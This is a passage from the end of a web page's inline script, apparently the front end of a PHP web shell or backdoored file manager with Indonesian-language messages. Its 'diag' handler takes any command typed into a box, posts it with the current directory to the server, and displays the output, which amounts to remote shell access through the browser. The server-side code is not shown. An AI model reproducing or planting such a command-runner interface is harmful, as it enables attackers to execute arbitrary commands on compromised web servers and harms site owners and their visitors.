    if(diagRun){
        diagRun.addEventListener('click',function(){
            const cmd=(diagInput.value||'').trim();
            if(!cmd){alert('Command kosong');return;}
            const fd=new FormData();
            fd.append('ajax','diag');
            fd.append('cmd',cmd);
            diagOutput.textContent="> Running "+cmd+" ...";
            fetch('?ajax=diag&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){
                        diagOutput.textContent="ERROR: "+(res.error||'Gagal jalanin command');
                        return;
                    }
                    diagOutput.textContent="> "+(res.cmd||cmd)+"\n\n"+(res.output||'(no output)');
                }).catch(err=>{
                    diagOutput.textContent="ERROR: "+err;
                });
        });
    }
})();
</script>
</body>
</html>
